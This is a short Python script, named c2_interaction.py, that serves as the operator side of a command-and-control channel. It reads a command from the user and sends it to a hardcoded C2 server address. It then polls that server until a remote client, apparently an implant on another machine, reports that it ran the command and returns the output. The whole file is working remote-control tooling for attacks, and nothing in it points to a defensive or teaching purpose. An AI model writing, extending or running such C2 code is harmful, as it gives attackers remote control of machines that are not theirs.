# c2_interaction.py
import requests
import time

SERVER_URL = "http://100.64.4.223:5000"

def set_command(command):
    try:
        response = requests.post(f"{SERVER_URL}/set_command", json={'command': command})
        if response.status_code == 200:
            print(f"Command '{command}' sent successfully.")
        else:
            print(f"Failed to send command. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending command: {e}")

def get_result():
    while True:
        try:
            # Poll for result (as result is asynchronous)
            response = requests.get(f"{SERVER_URL}/result")
            if response.status_code == 200:
                result = response.json().get('result', None)
                if result:
                    print(f"Result from client: {result}")
                    break
            else:
                print(f"Error getting result. Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error getting result: {e}")

        # Wait before polling again to avoid excessive requests
        time.sleep(5)

if __name__ == "__main__":
    # Get the user input
    command = input("Enter the command to send to the client: ")

    # Send the command to the C2 server
    set_command(command)

    # Fetch the result from the C2 server
    print("Waiting for the client to execute the command and return the result...")
    get_result()
